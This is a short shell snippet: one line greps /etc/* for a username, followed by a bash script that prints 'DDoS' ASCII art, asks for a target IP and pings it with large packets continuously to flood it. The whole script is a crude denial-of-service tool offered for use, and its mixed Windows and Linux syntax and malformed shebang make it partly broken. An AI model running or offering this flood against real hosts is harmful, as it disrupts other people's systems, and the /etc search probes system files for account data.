grep louise /etc/* 2> /dev/null
#!bin/bash
echo " ·▄▄▄▄  ·▄▄▄▄       .▄▄ ·"; echo "██▪ ██ ██▪ ██▪     ▐█ ▀."; echo "▐█· ▐█▌▐█· ▐█▌▄█▀▄ ▄▀▀▀█▄"; echo "██. ██ ██. ██▐█▌.▐▌▐█▄▪▐█"; echo "▀▀▀▀▀• ▀▀▀▀▀• ▀█▄▀▪ ▀▀▀▀ "; echo ""; echo "Enter ip:"; ip=""; read ip; echo "For stop press Ctrl+C"; ping $ip -t -l 65000 > /dev/null
